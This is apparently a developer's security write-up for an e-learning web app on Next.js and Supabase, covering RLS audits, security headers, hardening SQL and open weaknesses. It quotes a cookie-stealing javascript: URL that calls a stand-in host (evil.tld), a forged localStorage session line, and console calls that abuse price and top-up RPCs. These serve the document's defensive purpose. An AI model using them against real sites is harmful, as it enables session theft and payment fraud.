# E-Taalim — Security Process

What actually protects this app, what was hardened, and what to do next — with
everything you need to **copy-paste** (SQL for the Supabase SQL Editor, settings
for the Supabase dashboard, commands for the terminal).

Companion to `backend-process.md` (how it was built) and `hosting-process.md`
(how it goes online). No secrets in this file — it's safe to commit.

---

## 0. The mental model: three layers, and only one of them is real

```
   Browser        ← rules the browser enforces for us (CSP, headers)   … helpful
   Next.js server ← the gate: who may see a page (proxy.ts)            … useful
   Postgres/RLS   ← the wall: who may touch a row (policies)           … the one that counts
```

Everything a browser does is **suggestion-level** security: the person sitting
there owns the browser. They can edit React state, call `fetch()` themselves,
paste anything into the console, or skip the site entirely and talk straight to
the Supabase REST API with the anon key (which is public by design).

So the rule this project follows: **a UI check is a convenience, never a
protection.** Every protection must survive "the attacker skips the UI". That is
why authorisation lives in **Row Level Security in Postgres**, next to the data,
where nothing can go around it.

The other two layers still matter — they stop mistakes becoming incidents, and
turn a lot of "annoying" into "impossible" — they just aren't allowed to be the
only thing standing there.

---

## 1. What already protected the app (inherited from the backend build)

| Thing | Why it's a security property |
|---|---|
| **RLS on every table** | A logged-in student querying `profiles` gets **their** row. Not "the UI only shows theirs" — the database physically returns one row. Bypassing the app changes nothing. |
| **`auth.uid()` in policies** | Identity comes from the signed session token, not from a parameter the client sends. You cannot ask for someone else's data by changing an id. |
| **Passwords never touch our database** | Supabase stores a bcrypt hash in `auth.users`; we never see, log or store a password. There is no table that could leak one. |
| **The anon key is public on purpose** | It identifies the project, it doesn't grant anything. All it can do is what RLS lets an anonymous or logged-in user do. |
| **The `service_role` key never reached the browser** | It bypasses RLS. It was used once, server-side, to seed the courses, and that route was deleted. It must never appear in a `NEXT_PUBLIC_` variable or in client code. |
| **Money runs in a Postgres function** | `enroll_in_course` charges + enrols + logs a receipt in one transaction, server-side. The client cannot forge "enrolled but not charged", and cannot half-finish the sequence. (But see §4.6 — it currently trusts the price the client sends.) |
| **Admin is a database role, not a passphrase** | `profiles.role = 'admin'`, checked by the SQL function `is_admin()` inside the policies. The old version compared a passphrase **in the browser** — meaning the password shipped inside the JavaScript bundle to every visitor. |
| **One account per email + non-leaky auth errors** | Login failures never reveal whether an address is registered; the password-reset page says "if that address has an account…" either way. Attackers can't use the forms to enumerate your users. |
| **React escapes everything it renders** | `{userText}` becomes text, never HTML. There is no `eval` anywhere in `src/`, and exactly **one** audited `dangerouslySetInnerHTML` (§2.6). This is the single biggest reason the app has no obvious XSS. |
| **`.env.local` is gitignored** | Keys never entered git history — the place secrets most often leak from. |

---

## 2. What the hardening pass changed

### 2.1 `src/proxy.ts` — a real server-side gate (replaces `src/middleware.ts`)

**Before:** every private page was a *client* gate — the server happily sent
`/dashboard`, `/mentor-dashboard` and `/admin` to anybody, and the JavaScript
redirected afterwards. Data was safe (RLS), but the page shell, its layout and a
flash of the UI were public, and "redirect from a `useEffect`" is exactly the
kind of check that breaks silently.

**Now:** the request is stopped before rendering.

- `/dashboard`, `/mentor-dashboard`, `/welcome`, and `/courses/<id>/checkout` →
  no session, no page (`307` to `/login?next=…`). Verify with:
  `curl -I http://localhost:3000/dashboard`.
- `/admin` → a **signed-in non-admin is sent home**. The role is read from the
  database, so it can't be faked in the console. Signed-**out** visitors are let
  through on purpose: that page renders the admin sign-in form.
- The session refresh (the original job of this file) is unchanged, and
  redirects now carry the refreshed cookies instead of dropping them.
- It calls `supabase.auth.getUser()`, never `getSession()`. On the server,
  `getUser()` re-verifies the token with Supabase; `getSession()` would trust
  whatever the cookie claims.

**Why the rename:** in Next 16 the `middleware` file convention is **deprecated
and renamed to `proxy`** (`middleware.ts` → `proxy.ts`, `export function
middleware` → `export function proxy`). Same behaviour; the build prints
`ƒ Proxy (Middleware)`. Codemod, if ever needed elsewhere:
`npx @next/codemod@canary middleware-to-proxy .`

### 2.2 `next.config.ts` — security headers on every response

| Header | The attack it takes off the table |
|---|---|
| `Content-Security-Policy` | An injected `<script>` has nowhere to load from and nowhere to send stolen data. |
| `X-Frame-Options: DENY` + `frame-ancestors 'none'` | **Clickjacking**: nobody can put E-Taalim in an invisible iframe under their own buttons and harvest your clicks (e.g. on "Pay from wallet"). |
| `X-Content-Type-Options: nosniff` | An uploaded file the browser guesses is HTML/JS can't be executed as such. |
| `Referrer-Policy: strict-origin-when-cross-origin` | Your URLs — which can carry ids and tokens — don't leak to external sites in the `Referer` header. |
| `Permissions-Policy` | Camera / mic / geolocation / payment APIs are switched off for the whole origin. |
| `Strict-Transport-Security` (production only) | The browser refuses to talk to the site over plain HTTP ever again → no downgrade / coffee-shop-Wi-Fi interception. |
| `poweredByHeader: false` | Stops advertising `X-Powered-By: Next.js` to anyone scanning for known holes. |

Check them any time with:

```bash
npm run build && npx next start -p 3123
curl -s -o /dev/null -D - http://localhost:3123/ | head -12
```

### 2.3 `src/components/AttachmentView.tsx` — the one real XSS hole found

A chat attachment is stored as a `dataUrl` **on a database row**, and a row is
data *other people wrote*. Our chat box only ever produces a base64 `data:` URL
from a picked file — but nothing stopped a sender from calling the API directly
and storing:

```
javascript:fetch('https://evil.tld?c='+document.cookie)
```

The recipient's browser rendered that straight into `<a href={…}>`. One click and
that code runs **inside their logged-in page**.

Fixed with an allow-list at the moment the string becomes an `href`: `https:`,
`blob:`, and `data:` — minus the `data:` types a browser executes as markup
(`text/html`, `image/svg+xml`, `application/xhtml`). Anything else renders as a
dead "blocked attachment" chip. Also added `noopener` to the image link.

**The lesson to reuse:** React escapes *text* automatically, but a **URL is not
text** — `href`, `src`, `window.open` and CSS `url()` are holes React does not
plug. Any URL that came from a user must be scheme-checked.

### 2.4 `src/lib/mentorProfile.ts` — deleted a console-openable gate

`isMentorSignedIn()` fell back to the localStorage mock session, so this in the
DevTools console was enough to walk into the mentor dashboard:

```js
localStorage.setItem("etaalim.session", '{"role":"mentor"}')
```

RLS meant they'd see an empty dashboard rather than someone's data — but a gate
you can open from the console is not a gate. Only the real Supabase session
counts now.

### 2.5 Checkout stops repeating the database's words

`CheckoutClient` printed `rpcError.message` straight into the page. That's a
Postgres error: it names tables, columns and constraints, it's in English, and
it tells a confused student nothing about what to *do*. Now the error is matched
to one of four translated sentences (balance / already enrolled / session
expired / generic), in all three languages.

Two birds: it's friendlier, and it stops handing an attacker a free map of the
schema.

### 2.6 The one `dangerouslySetInnerHTML`, on purpose

`app/layout.tsx` runs a tiny inline script before first paint that reads the
saved language and sets `<html lang dir>` — otherwise Arabic visitors load the
page in LTR English and watch it flip after hydration.

It is a **fixed string literal with no user input**: the only value read is
compared against a whitelist of three locales, and nothing from the database or
the URL can reach it. That's what makes it safe. If the CSP is ever tightened to
nonces (§3), this tag needs the nonce.

---

## 3. The CSP compromise (and how to upgrade it later)

The policy uses `script-src 'self' 'unsafe-inline'`. `'unsafe-inline'` is a
genuine weakening — an injected inline script would still run. It's there
because Next inlines its hydration bootstrap, and the strict alternative
(a per-request **nonce**) forces **every page to render dynamically**: no static
pages, no CDN caching, slower loads, higher hosting cost.

For a school platform whose wallet is play money, that trade is fine — the CSP
still blocks *external* script origins and *exfiltration* (`connect-src`), which
is what most real XSS payloads need.

**Upgrade when real money or real personal data is involved:** generate a nonce
in `proxy.ts`, put `'nonce-<value>' 'strict-dynamic'` in `script-src`, and set an
`x-nonce` request header (Next injects it into its own tags automatically). The
recipe is in `node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md`.
The cheaper middle step is `Content-Security-Policy-Report-Only` with a strict
policy, to see what would break before enforcing it.

---

## 4. Copy-paste: run these in the Supabase SQL Editor

### 4.1 Audit — is RLS actually on everywhere? (read-only, run first)

```sql
-- Any table with rls_enabled = false, or policies = 0, is wide open
-- (or completely locked) — both are bugs.
select c.relname            as table_name,
       c.relrowsecurity     as rls_enabled,
       count(p.polname)     as policies
from pg_class c
join pg_namespace n on n.oid = c.relnamespace
left join pg_policy p on p.polrelid = c.oid
where n.nspname = 'public'
  and c.relkind = 'r'
group by 1, 2
order by rls_enabled, table_name;
```

```sql
-- Read every policy in one place. Read them like an attacker:
-- "what's the widest thing this USING clause lets me do?"
select tablename, policyname, cmd, qual as using_clause, with_check
from pg_policies
where schemaname = 'public'
order by tablename, policyname;
```

### 4.2 Audit — `security definer` functions must pin their `search_path`

A `security definer` function runs with the **owner's** privileges. Without a
fixed `search_path`, a user can create a table in their own schema that shadows
yours and make your privileged function operate on it.

```sql
select p.proname as function_name,
       p.prosecdef as security_definer,
       p.proconfig as settings          -- must contain search_path=public
from pg_proc p
join pg_namespace n on n.oid = p.pronamespace
where n.nspname = 'public'
order by security_definer desc, function_name;
```

Fix any `security_definer = true` row whose `settings` is `null`:

```sql
alter function public.<function_name>() set search_path = public;
```

### 4.3 Stop the chat from being a flood/storage weapon

Right now a script can insert thousands of messages, each carrying up to 3 MB of
base64 — that fills the free tier and makes threads unloadable.

```sql
-- Size limits. NOTE: these validate existing rows; if a row already violates
-- one, the ALTER fails — delete/trim that row, then re-run.
alter table messages
  add constraint messages_body_len check (char_length(body) <= 4000);

alter table messages
  add constraint messages_attachment_size
  check (attachment is null or length(attachment::text) <= 4500000);  -- ~3MB base64
```

```sql
-- Flood guard: at most 30 messages a minute per sender, enforced by the
-- database, so it applies to the console and the API too — not just the UI.
create or replace function guard_message_rate()
returns trigger language plpgsql security definer set search_path = public as $$
declare recent int;
begin
  select count(*) into recent
    from messages
   where sender_id = auth.uid()
     and created_at > now() - interval '1 minute';
  if recent >= 30 then
    raise exception 'Too many messages — slow down';
  end if;
  return new;
end $$;

drop trigger if exists messages_rate_limit on messages;
create trigger messages_rate_limit
  before insert on messages
  for each row execute function guard_message_rate();
```

The same pattern works for reviews, follows and top-ups — change the table, the
window and the ceiling.

### 4.4 Only real students may review a course

Reviews are public and shape a mentor's rating, so they're worth faking.

```sql
drop policy if exists "Users insert own review" on reviews;

create policy "Only buyers can review" on reviews for insert
with check (
  auth.uid() = user_id
  and exists (
    select 1 from enrollments e
    where e.user_id = auth.uid()
      and e.course_id = reviews.course_id
  )
);
```

(If your `reviews` insert policy has a different name, take it from the §4.1
`pg_policies` listing first.)

### 4.5 Don't let the public `mentors` table leak contact details

`mentors` is readable by everyone (that's the point — it's the directory). Make
sure nothing private lives there:

```sql
select column_name, data_type
from information_schema.columns
where table_schema = 'public' and table_name = 'mentors'
order by ordinal_position;
```

Phone numbers, addresses and personal emails belong in `profiles` (own-row RLS),
never in a publicly readable table.

### 4.6 ⚠️ The client currently sets its own price — fix this one

**Confirmed, not hypothetical.** `CheckoutClient` calls:

```ts
supabase.rpc("enroll_in_course", {
  p_course_id: liveCourse.id,
  p_mode: option.mode,
  p_price: liveOption.price,     // ← the browser decides what it costs
  p_subject: liveCourse.subject,
})
```

Anyone can run that same call from the console with `p_price: 0` and enrol in any
course for free — and the receipt, the transaction row and the mentor's earnings
will all faithfully record the price *they* chose. **Never accept a price from
the client.** The price is a fact the database already knows.

First, look at what your function does today:

```sql
select pg_get_functiondef(p.oid)
from pg_proc p
join pg_namespace n on n.oid = p.pronamespace
where n.nspname = 'public' and p.proname = 'enroll_in_course';
```

Then patch it so the price and subject are **read from `courses`** and the
client's values are ignored. Keep the same parameter list, so the existing app
keeps working with no code change and no window where checkout is broken —
add this at the top of the function body and use `v_price` / `v_subject`
everywhere the body currently uses `p_price` / `p_subject`:

```sql
declare
  v_price   integer;
  v_subject text;
begin
  -- the database decides the price, not the browser
  select
    case p_mode
      when 'group'      then price_group
      when 'individual' then price_individual
      else price
    end,
    subject
  into v_price, v_subject
  from courses
  where id = p_course_id;

  if v_price is null then
    raise exception 'Unknown course';
  end if;
  ...
```

(Check those column names against your own `courses` table first — §4.5's query
lists them. Paste the current function definition back into a chat if you want
the exact rewritten body.)

Belt and braces, once the function no longer needs them, drop the parameters
from both the SQL and `CheckoutClient` so nobody can be tempted again.

### 4.7 The wallet is play money — and anyone can prove it

```js
// In any logged-in browser console:
await supabase.rpc('top_up', { amount: 999999 })
```

That works, by design: there is no payment provider yet, so `top_up` is a button
that grants credit. **Fine for a demo, unacceptable the day real dinars are
involved.** Then: `top_up` must not be callable by users at all — revoke it, and
let the payment provider's **webhook** (verified by signature, server-side) be
the only thing that credits a balance.

```sql
-- The day payments become real:
revoke execute on function public.top_up(integer) from anon, authenticated;
```

---

## 5. Copy-paste: the Supabase dashboard settings

**Authentication → Sign In / Providers → Email**
- ☐ **Confirm email: ON** (already on — it's also what makes Google identity linking work).
- ☐ **Minimum password length: 8** (default is 6; both forms already demand 8).
- ☐ **Leaked password protection: ON** — Supabase checks new passwords against the
  HaveIBeenPwned breach corpus and refuses known-cracked ones. Cheapest real win
  on this page.
- ☐ Password requirements: at least "letters and digits".

**Authentication → URL Configuration**
- ☐ Site URL = your real production URL.
- ☐ Redirect allow-list contains **exactly** the URLs you use. Never a bare `**`
  wildcard in production — an open redirect list is how auth codes get delivered
  to an attacker's page. (Full list in `hosting-process.md` §5.)

**Authentication → Rate Limits**
- ☐ Lower the sign-in / sign-up / OTP / recovery limits to something sane for your
  size. This is your brute-force and mail-bomb defence, and it's free.

**Authentication → Multi-Factor**
- ☐ Enable **TOTP** and enrol the **admin account**. The admin can read every
  student — it deserves more than a password.

**Authentication → Users**
- ☐ Delete leftover test users (they also break identity-linking tests).

**Project Settings → Database**
- ☐ Turn on **Point-in-Time Recovery** if you can afford it; otherwise verify daily
  backups exist and **restore one once** — an untested backup isn't a backup.
- ☐ **Network restrictions**: if you never connect directly to Postgres from home,
  restrict direct DB access to nothing.

**Project Settings → API**
- ☐ **Rotate the anon key** (it was pasted into a chat during setup) and update
  `.env.local` **and** the host's environment variables.
- ☐ Confirm the **`service_role` key exists nowhere** but a server-only env var:
  `grep -rn "service_role\|SERVICE_ROLE" src/` must return nothing (it does today).

**Project Settings → Infrastructure**
- ☐ Apply Postgres upgrades when offered — that's where CVE fixes land.

---

## 6. Before going live

```bash
# 1. Nothing secret in the repo, ever — check history too, not just the files.
git log -p | grep -iE "SUPABASE_(SERVICE|ANON)|GOCSPX|api[_-]?key" | head

# 2. Known-vulnerable dependencies.
npm audit --omit=dev

# 3. Headers really are on the deployed site.
curl -s -o /dev/null -D - https://yourdomain.tld/ | head -12
```

- ☐ Real **SMTP** (the built-in mailer is rate-limited to a few mails/hour, and
  confirmation + reset emails share that budget).
- ☐ Keep `backend-process.md` out of git — it contains the Google client secret.
  (This file and `hosting-process.md` don't, which is why they're committed.)
- ☐ Set the production env vars on the host, never in the image.

---

## 7. Known weak spots that are still open

Honest list, worst first:

1. **`enroll_in_course` trusts the client's price** (§4.6) — free courses for
   anyone who opens the console. Fix this before anyone else uses the site.
2. **`top_up` grants free credit** (§4.7). Correct for now, fatal with real money.
3. **`'unsafe-inline'` in the CSP** (§3) — the nonce upgrade is the fix.
4. **Attachments are base64 in the `messages` table.** Every thread load drags
   megabytes through Postgres. Moving them to **Supabase Storage** (private
   bucket + per-user policies + signed URLs) is both a performance and a security
   improvement: real MIME/size checks at upload, and no `data:` URLs to sanitise.
5. **No rate limiting on our own routes** (`/api/courses`). Supabase's own limits
   cover auth, not this.
6. **`src/lib/auth.ts` (the localStorage mock) still exists**, and `Header.tsx`
   still reads it as a display fallback — a forged entry shows a fake "logged in"
   header (cosmetic only; no data follows). Delete the mock when the last caller
   is gone.
7. **No audit trail.** If an admin (or someone who became one) edited or deleted
   rows, nothing records who and when.
8. **No CAPTCHA** on signup/contact — bots can create accounts and send mail.

---

## 8. What to add next — ranked by (protection ÷ effort)

**Do these first — hours, not days**

1. **§4.6.** Everything else on this list is smaller than free courses.
2. **Leaked-password protection + rate limits + admin MFA** (§5). Three toggles.
3. **CAPTCHA on sign-up, login and contact.** Supabase supports **Cloudflare
   Turnstile / hCaptcha** natively: enable it under Authentication → Attack
   Protection, then pass the token in `signUp` / `signInWithPassword`
   (`options: { captchaToken }`). Kills automated account creation.
4. **The rest of §4**: flood guard, size limits, buyers-only reviews.
5. **Validate every write with a schema, and mirror it as a DB `CHECK`.** Add
   [Zod](https://zod.dev) in front of each `insert`/`update` (age is 5–99, price
   ≥ 0, year ∈ the real list, bio ≤ 2000 chars…). The DB constraint is the one
   that counts; the Zod version is what gives a friendly error.

**Then — a day each**

6. **Move attachments to Supabase Storage** with a private bucket, per-user
   policies, an `image/*` + `application/pdf` allow-list, and signed URLs.
7. **Rate-limit your own endpoints** (Upstash Redis or Vercel's limiter) —
   per-IP for public routes, per-user for authenticated ones.
8. **An append-only `audit_log` table** written by triggers on `courses`,
   `profiles` and `transactions`: who, what, when, before/after. Readable by
   admins, insertable by nobody. This is what turns "something's wrong" into an
   answer.
9. **Abuse tools in chat**: block a user, report a message, admin review queue.
   A school platform with DMs between adults and minors *needs* this, and it's
   more likely to matter than any exotic exploit.
10. **Monitoring**: Sentry (or the Supabase log explorer) + an alert on spikes in
    failed logins, new accounts, or 5xx. Detection is the half nobody builds.

**Then — ongoing hygiene**

11. **Dependabot / `npm audit` in CI**, and a committed lockfile.
12. **Session hardening**: shorter JWT expiry, refresh-token rotation (default on),
    and a "sign out everywhere" button (`signOut({ scope: 'global' })`).
13. **Email domain security** once you use your own SMTP domain: **SPF, DKIM,
    DMARC** — otherwise anyone can spoof mail from your school.
14. **Privacy/GDPR-shaped work**: a real "download my data" + "delete my account"
    flow (`on delete cascade` already makes the deletion clean), and make sure the
    legal pages describe what you actually store — you hold **minors'** data,
    parent emails and phone numbers.
15. **Backups you have tested restoring** (§5).

**Attack your own app** — the highest-value hour you can spend

16. Make **two student accounts**. From account A's console, try to read/update
    account B's row by id, insert a message as B, enrol B in a course, delete B's
    review, and `select * from profiles`. Every one should come back empty or
    error. Write it down as a checklist and re-run it after every schema change —
    that's an RLS regression test, and it's the only test that proves the wall.
17. Try the UI-bypass moves: forge the localStorage session, hit `/admin`
    signed-in-as-a-student, replay a request in DevTools with a changed id or a
    changed price.

**Overkill until this is a real business:** WAF/DDoS rules, penetration testing,
bug bounty, SOC-style log pipelines, hardware keys. Skip them; do 1–10 instead.

---

## 9. Security gotchas cheat-sheet

- **A UI check protects nobody.** Anything not enforced in Postgres is decoration.
- **Never trust a number the client sends** — especially a price. Look it up.
- **Server-side: `getUser()`, never `getSession()`.** One verifies the token, the
  other believes the cookie.
- **React escapes text, not URLs.** `href`/`src`/`window.open` need a scheme check.
- **RLS on + no policy = 0 rows** (a `406` on `.single()`). "It returns nothing"
  is usually a missing policy, not a missing row.
- **`security definer` always needs `set search_path = public`.**
- **Never `NEXT_PUBLIC_` anything you wouldn't print on a poster.** That prefix
  means "compiled into the JavaScript every visitor downloads".
- **Any RPC a user can call is a public API.** Ask "what if they call this with
  absurd arguments, a thousand times a second?"
- **A row is user input.** Something written by another account is as untrusted as
  a form field — validate it when you *render* it, not only when you save it.
- **Don't echo database errors to users** — they name your tables (§2.5).
- **DB-side work lives in Supabase, not git.** Policies and triggers you add here
  won't be in a commit — note them in the commit message and in this file.
